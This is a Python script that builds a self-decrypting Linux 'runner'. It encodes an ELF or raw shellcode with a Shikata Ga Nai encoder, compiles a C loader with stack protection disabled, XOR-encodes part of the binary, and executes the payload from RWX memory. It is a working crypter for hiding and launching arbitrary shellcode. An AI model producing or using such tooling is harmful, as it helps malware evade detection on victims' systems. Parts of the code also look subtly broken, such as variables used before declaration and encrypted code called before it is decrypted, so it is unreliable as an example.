#!/usr/bin/env python3
import argparse
import os
import subprocess
import sys
import tempfile
import struct
import shutil
import random

# Import the ShikataGaNaiEncoder from our previous module.
try:
    from shikata_ga_nai import ShikataGaNaiEncoder
except ImportError:
    sys.exit("Error: Cannot import shikata_encoder module. Make sure it is in the same directory.")

def detect_arch(elf_file):
    """
    Detect whether the input ELF is 32-bit or 64-bit.
    Uses 'readelf -h' to parse the ELF header.
    Returns "x32" or "x64".
    """
    try:
        out = subprocess.check_output(["readelf", "-h", elf_file], universal_newlines=True)
    except Exception as e:
        sys.exit(f"Error calling readelf: {e}")

    for line in out.splitlines():
        if "Class:" in line:
            if "ELF32" in line:
                return "x32"
            elif "ELF64" in line:
                return "x64"
    sys.exit("Unable to determine ELF class.")

def generate_runner_c(encoded_payload, arch, raw_payload):
    """
    Generate a C source code string for the runner.
    The runner embeds the encoded payload as a byte array and places the
    self-decrypting region (delimited by markers) into a dedicated section
    (.decrypted) so that the markers and runner entry function are contiguous.
    
    The runner includes a self-decrypt routine that brute-forces a weak XOR key
    (0x42) until the decrypted marker ("DECO") appears.
    """
    # Note: We forward-declare __decrypt_end so it can be used in self_decrypt_region.
    c_code = f'''\
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>

#define WEAK_KEY 0x42

// Forward declaration for __decrypt_end.
extern char __decrypt_end[];

// Place the following items in the ".decrypted" section to enforce contiguity.
__attribute__((section(".decrypted")))
char __decrypt_start[] = "DECO_START";

__attribute__((section(".decrypted")))
char __decrypt_marker[] = "DECO";

// Self-decryption routine.
// This function brute-forces the XOR key for the region between __decrypt_start and __decrypt_end.
void self_decrypt_region() {{
    unsigned char *start = (unsigned char *)__decrypt_start;
    unsigned char *end = (unsigned char *)__decrypt_end;
    size_t region_size = end - start;
    int key;
    for (key = 0; key < 256; key++) {{
        unsigned char temp[region_size];
        memcpy(temp, start, region_size);
        for (size_t i = 0; i < region_size; i++) {{
            temp[i] ^= key;
        }}
        if (memcmp(temp, __decrypt_marker, 4) == 0) {{
            for (size_t i = 0; i < region_size; i++) {{
                start[i] ^= key;
            }}
            // Uncomment for debugging:
            // printf("Self-decryption key found: 0x%02x\\n", key);
            return;
        }}
    }}
    fprintf(stderr, "Failed to self-decrypt runner region.\\n");
    exit(1);
}}

__attribute__((section(".decrypted")))
void runner_entry() {{
    self_decrypt_region();
    // Allocate executable memory for the payload.
    void *exec_mem = mmap(NULL, payload_size, PROT_READ | PROT_WRITE | PROT_EXEC,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (exec_mem == MAP_FAILED) {{
        perror("mmap");
        exit(1);
    }}
    memcpy(exec_mem, encoded_payload, payload_size);
#if defined(__i386__) || defined(__x86_64__)
    __builtin___clear_cache((char*)exec_mem, (char*)exec_mem + payload_size);
#endif
    void (*payload_func)() = exec_mem;
    payload_func();
    exit(0);
}}

__attribute__((section(".decrypted")))
char __decrypt_end[] = "DECO_END";

// Embedded encoded payload.
unsigned char encoded_payload[] = {{
{", ".join("0x{:02x}".format(b) for b in encoded_payload)}
}};
size_t payload_size = sizeof(encoded_payload);

int main(int argc, char *argv[]) {{
    runner_entry();
    return 0;
}}
'''
    return c_code

def compile_runner(c_source, arch, output_filename):
    """
    Compile the C source code into an ELF file.
    Uses gcc. For x32, adds -m32; for x64, assumes -m64.
    Flags disable stack protection and enable an executable stack.
    """
    tmp_dir = tempfile.mkdtemp(prefix="runner_build_")
    c_file = os.path.join(tmp_dir, "runner.c")
    with open(c_file, "w") as f:
        f.write(c_source)
    gcc_cmd = ["gcc", c_file, "-o", output_filename, "-fno-stack-protector", "-z", "execstack"]
    if arch == "x32":
        gcc_cmd.insert(1, "-m32")
    try:
        subprocess.check_call(gcc_cmd)
    except subprocess.CalledProcessError as e:
        shutil.rmtree(tmp_dir)
        sys.exit(f"gcc compilation failed: {e}")
    shutil.rmtree(tmp_dir)

def postprocess_runner(runner_filename):
    """
    Post-process the compiled ELF runner.
    Opens the runner binary, locates the region between the markers
    "DECO_START" and "DECO_END", and XORs that region with a weak key (0x42).
    The final ELF does not contain the decryption key; the runner will brute-force it at runtime.
    """
    with open(runner_filename, "rb") as f:
        data = bytearray(f.read())
    marker_start = b"DECO_START"
    marker_end = b"DECO_END"
    start_idx = data.find(marker_start)
    end_idx = data.find(marker_end)
    if start_idx == -1 or end_idx == -1 or end_idx <= start_idx:
        sys.exit("Failed to locate decryption markers in the runner binary.")
    for i in range(start_idx, end_idx):
        data[i] ^= 0x42
    with open(runner_filename, "wb") as f:
        f.write(data)

def main():
    parser = argparse.ArgumentParser(
        description="Builder: Encodes an ELF file using Shikata Ga Nai and builds a self-decrypting Linux runner ELF.",
        epilog=(
            "Usage Examples:\n"
            "  1. Build a runner for a full ELF executable:\n"
            "         python3 linux_builder.py -f input.elf -o final_runner.elf\n\n"
            "  2. Build a runner for raw shellcode (use --raw flag):\n"
            "         python3 linux_builder.py -f shellcode.bin --raw -o final_runner.elf\n"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument("-f", "--file", required=True, help="Input ELF file (full executable or raw shellcode)")
    parser.add_argument("-o", "--output", required=True, help="Output ELF file (final runner)")
    parser.add_argument("--raw", action="store_true", help="Indicate that the input file is raw shellcode rather than a full ELF")
    args = parser.parse_args()

    # Detect architecture (for raw shellcode, default to x32 if not specified).
    arch = detect_arch(args.file) if not args.raw else "x32"
    print(f"[+] Detected architecture: {arch}")

    # Read input file.
    with open(args.file, "rb") as f:
        payload_data = f.read()

    # Instantiate the encoder with basic options.
    encoder = ShikataGaNaiEncoder(arch=arch)
    # Encode the payload.
    encoded_payload = encoder.encode(payload_data)
    print(f"[+] Encoded payload size: {len(encoded_payload)} bytes")

    # Generate the runner C code with the encoded payload embedded.
    runner_c_code = generate_runner_c(encoded_payload, arch, args.raw)
    # Compile the runner to a temporary file.
    runner_filename = args.output + ".tmp"
    compile_runner(runner_c_code, arch, runner_filename)
    print("[+] Runner compiled successfully.")

    # Post-process the runner: XOR-encode the designated region.
    postprocess_runner(runner_filename)
    print("[+] Runner post-processed (self-decrypting region XOR-encoded).")

    # Rename/move the temporary runner file to the final output.
    shutil.move(runner_filename, args.output)
    print(f"[+] Final runner ELF generated: {args.output}")

if __name__ == "__main__":
    main()
